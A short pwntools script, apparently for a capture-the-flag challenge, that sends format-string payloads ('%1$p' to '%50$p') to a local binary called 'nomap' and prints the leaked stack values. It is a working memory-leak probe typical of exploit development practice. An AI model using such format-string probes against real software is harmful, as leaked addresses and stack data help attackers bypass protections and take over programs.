from pwn import *

p = process("./nomap")

p.recvuntil(b"format string sini: ")

for i in range(1, 51):
    payload = f"%{i}$p".encode()  
    print(f"[*] Sending: {payload.decode()}")
    p.sendline(payload)
    response = p.recvline().strip()
    print(f"[+] Response: {response.decode(errors='ignore')}")

p.sendline(b"exit")
p.close()
